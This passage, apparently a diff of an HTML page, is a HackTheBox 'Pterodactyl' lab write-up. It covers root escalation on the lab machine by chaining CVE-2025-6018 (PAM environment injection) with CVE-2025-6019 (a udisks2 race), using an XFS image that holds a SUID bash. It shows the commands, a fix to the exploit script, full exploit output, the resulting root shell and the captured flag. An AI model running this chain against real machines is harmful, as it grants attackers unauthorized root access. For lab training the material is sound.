</p><p>    bash                             100%  989KB  70.6KB/s   00:14    </p><p>    ```</p><p>    ```bash</p><p>    ❯ sudo cp /tmp/bash_target /mnt/xfs/bash</p><p>    ❯ sudo chmod 4755 /mnt/xfs/bash</p><p>    ❯ sudo umount /mnt/xfs</p><p>    ❯ ls -la /mnt/xfs/</p><p>    total 8</p><p>    drwxr-xr-x 2 root root 4096 Apr 19 10:45 .</p><p>    drwxr-xr-x 3 root root 4096 Apr 19 10:45 ..</p><p>    ❯ sudo mount -o loop xfs.image /mnt/xfs</p><p>    ❯ ls -la /mnt/xfs/</p><p>    total 996</p><p>    drwxr-xr-x 2 root root      18 Apr 19 10:54 .</p><p>    drwxr-xr-x 3 root root    4096 Apr 19 10:45 ..</p><p>    -rwsr-xr-x 1 root root 1012656 Apr 19 10:54 bash</p><p>    ❯ sudo umount /mnt/xfs</p><p>    ```</p><p>    starting http server to transfer the image and the exploit </p><p>    ```bash</p><p>    python3 -m http.server 8080</p><p>    ```</p><p>    &gt; didnt work too</p><p>    &gt; </p><p>so after alot of tries with the 2025-6019 , i found this repo that make the image with the needed flags https://github.com/0rionCollector/Exploit-Chain-CVE-2025-6018-6019/tree/main</p><pre><code>cp /tmp/bash_target &quot;$MOUNT_DIR/bash&quot;
-chown root:root &quot;$MOUNT_DIR/bash&quot;
-chmod 4755 &quot;$MOUNT_DIR/bash&quot;
+[*] Starting exploit chain...
+[*] Step 1: Triggering CVE-2025-6018 (PAM Injection)...
+[+] Successfully injected into ~/.pam_environment
+[+] New session is ACTIVE (Active=yes)
+[*] Step 2: Triggering CVE-2025-6019 (udisks2 Race Condition)...
+[*] Creating malicious XFS image...
+[+] Mount successful!
+[+] Success! Root shell spawned.
 
-=================================
-sed -i 's/mkfs.xfs -f &quot;$IMAGE_PATH&quot;/mkfs.xfs -f -i exchange=0 -n parent=0 &quot;$IMAGE_PATH&quot;/g' ExploitChain.sh
-#this line was the whole problem that the machine was on v4 which use flags &quot;-i exchange=0 -n parent=0&quot; but the tool was making it for v5 which is (1,1)</code></pre><p>this code shows some changes in the <a href="http://exploit.sh">exploit.sh</a> “i have changed the /bin/bash to the bash that i got from the target “</p><pre><code>scp phileasfogg3@pterodactyl.htb:/bin/bash /tmp/bash_target</code></pre><p>so after using stage1 in the exploit which creating the image </p><pre><code>sudo bash ExploitChain.sh stage1
-
-╔═══════════════════════════════════════════════════════════╗
-║       CVE-2025-6018 + CVE-2025-6019 Chain Exploit        ║
-║           PAM Injection → UDisks2 LPE (Root)             ║
-╚═══════════════════════════════════════════════════════════╝
-
-Three-Stage Attack:
-  STAGE 1: Create XFS image (Kali/Attacker machine)
-  STAGE 2: PAM environment injection (Target)
-  STAGE 3: UDisks2 privilege escalation (Target → Root)
-
-[*] ═══════════════════════════════════════════════════
-[*] STAGE 1: Create XFS Image with SUID bash
-[*] ═══════════════════════════════════════════════════
-
-[i] Image path: ./xfs.image
-[i] Checking dependencies...
-[+] dd: found
-[+] mkfs.xfs: found
-[+] mount: found
-[+] umount: found
-
-[*] Creating 300 MB disk image...
-300+0 records in
-300+0 records out
-314572800 bytes (315 MB, 300 MiB) copied, 0.0582978 s, 5.4 GB/s
-[+] Image file created: 300M
-
-[*] Formatting as XFS filesystem...
-[+] XFS filesystem created
-
-[*] Mounting image at: /tmp/tmp.U2MdqXHkZz
-[+] Image mounted successfully
-
-[*] Copying /bin/bash and setting SUID bit...
-
-[i] Verifying SUID bash in image:
--rwsr-xr-x 1 root root 989K Apr 19 15:43 /tmp/tmp.U2MdqXHkZz/bash
-[+] SUID bash configured successfully
-
-[*] Syncing and unmounting...
-
-╔═══════════════════════════════════════════════════════════╗
-║              STAGE 1 COMPLETE - IMAGE READY               ║
-╚═══════════════════════════════════════════════════════════╝
-
-Image created: /home/samurai/labs/hackthebox/Pterodactyl/exploit/Exploit-Chain-CVE-2025-6018-6019/xfs.image
-Image size: 300M
-Filesystem:  SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)
-
-Next steps:
-1. Transfer image to target:
-   scp xfs.image user@target:/tmp/
-
-2. On target, run STAGE 2:
-   ExploitChain.sh stage2
-</code></pre><p>i have transfer the image and the exploit to the target using scp also </p><pre><code>❯ scp xfs.image.gz phileasfogg3@pterodactyl.htb:/tmp/
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-(phileasfogg3@pterodactyl.htb) Password: 
-xfs.image.gz                                                                                          100%  852KB 151.2KB/s   00:05    
-❯ scp ExploitChain.sh phileasfogg3@pterodactyl.htb:/home/phileasfogg3/
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
-(phileasfogg3@pterodactyl.htb) Password: 
-ExploitChain.sh                </code></pre><p>i have started the stage 2 which creating the pam_environment file that abuse 2025-6018 as i have been taking about the allow user </p><pre><code>phileasfogg3@pterodactyl:~&gt; bash ExploitChain.sh auto /tmp/xfs.image 
-
-╔═══════════════════════════════════════════════════════════╗
-║       CVE-2025-6018 + CVE-2025-6019 Chain Exploit        ║
-║           PAM Injection → UDisks2 LPE (Root)             ║
-╚═══════════════════════════════════════════════════════════╝
-
-Three-Stage Attack:
-  STAGE 1: Create XFS image (Kali/Attacker machine)
-  STAGE 2: PAM environment injection (Target)
-  STAGE 3: UDisks2 privilege escalation (Target → Root)
-
-[i] Automatic exploitation mode
-[i] Detecting current environment...
-
-[+] allow_active already obtained - skipping STAGE 2
-[*] Proceeding to STAGE 3
-
-[*] ═══════════════════════════════════════════════════
-[*] STAGE 3: CVE-2025-6019 (UDisks2 LPE)
-[*] ═══════════════════════════════════════════════════
-
-[i] Verifying allow_active status...
-[+] allow_active status: CONFIRMED
-
-[i] Current session properties:
-    Remote=yes
-    RemoteHost=10.10.17.212
-    Type=tty
-    Class=user
-    Active=yes
-    State=active
-
-[i] Checking dependencies...
-[+] dd: found
-[+] udisksctl: found
-[+] gdbus: found
-[+] killall: found
-[+] file: found
-
-[+] XFS image found: /tmp/xfs.image
-[i] Verifying image...
-    /tmp/xfs.image: SGI XFS filesystem data (blksz 4096, inosz 512, v2 dirs)
-
-[*] Stopping gvfs-udisks2-volume-monitor...
-[i] gvfs monitor not running (OK)
-
-[*] Setting up loop device via UDisks2...
-[i] Calling: udisksctl loop-setup --file /tmp/xfs.image
-[+] Loop device created: /dev/loop5
-
-[*] Starting filesystem busy-keeper...
-[i] This prevents automatic unmount after resize failure
-[+] Background watcher started (PID: 4001)
-
-[*] ═══════════════════════════════════════════════════
-[*] Triggering CVE-2025-6019 via Filesystem.Resize
-[*] ═══════════════════════════════════════════════════
-
-D-Bus call details:
-  Destination: org.freedesktop.UDisks2
-  Object:      /org/freedesktop/UDisks2/block_devices/loop5
-  Method:      org.freedesktop.UDisks2.Filesystem.Resize
-  Parameters:  0 (size), {} (options)
-
-[*] Calling resize (will fail - this is expected)...
-
-    Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop5: Failed to unmount '/dev/loop5' after resizing it: target is busy
-
-[*] Waiting for automatic mount to appear...
-[i] libblockdev will mount filesystem before resize attempt
-
-[*] Searching for SUID bash in /tmp/blockdev*...
-[i] Search attempt 1/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 2/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 3/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 4/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 5/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 6/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 7/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 8/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 9/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-[i] Search attempt 10/10...
-[+] Mount point found: /tmp/blockdev.4PU3N3
-[i] Contents:
-
-[-] SUID bash not found after 10 attempts
-[-] Exploitation failed!
-phileasfogg3@pterodactyl:~&gt; ls -l /tmp/blockdev*
-ls: cannot open directory '/tmp/blockdev.4PU3N3': Permission denied
-/tmp/blockdev.4RPGO3:
-total 992
--rwsr-xr-x 1 root root 1012656 Apr 19 16:52 bash
-ls: cannot open directory '/tmp/blockdev.D6TEO3': Permission denied
-ls: cannot open directory '/tmp/blockdev.GUEUN3': Permission denied
-ls: cannot open directory '/tmp/blockdev.I90BO3': Permission denied
-ls: cannot open directory '/tmp/blockdev.Z5ZVN3': Permission denied
-phileasfogg3@pterodactyl:~&gt; ls -l /tmp/blockdev.4RPGO3/bash
--rwsr-xr-x 1 root root 1012656 Apr 19 16:52 /tmp/blockdev.4RPGO3/bash
-phileasfogg3@pterodactyl:~&gt; /tmp/blockdev.4RPGO3/bash -p
-bash-4.4# id
-uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
-bash-4.4# pwd
-/home/phileasfogg3
-bash-4.4# cd /root
-bash-4.4# cat root.txt
-657f11ccca61e9b02a8dc7116f2b2116
-</code></pre><p>as u can see the bash file was there mounted but the exploit couldnt realize it so all i needed to do just to run it and baaam root shell spawn</p><p>&gt; what i have learned from this lab is to not give up , it was more mental than technical to me so always dont lose hope in a thing that u love</p><p>&gt; </p><p><img alt="image.png" src="image%2010.png" /></p><p><img alt="image.png" src="image%2011.png" /></p></article>
+root@pterodactyl:/# whoami
+root
+root@pterodactyl:/# cat /root/root.txt</code></pre>
+<p><img alt="image.png" src="image%2010.png" /></p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+<p>And we are <strong>root</strong> ;)</p>
+<p>What I learned from this lab: don't give up. It was more mental than technical — always keep going on something you love.</p>
+</article>
     </section>
     <footer>
       <span class="hex-dot" aria-hidden="true"></span>
       H4rm0ny Content Hub &copy; 2026
       <span class="hex-dot" aria-hidden="true"></span>
     </footer>
-  </main>
-
+  </div>
   <script type="module" src="../../../../js/main.js"></script>
 </body>
 </html>
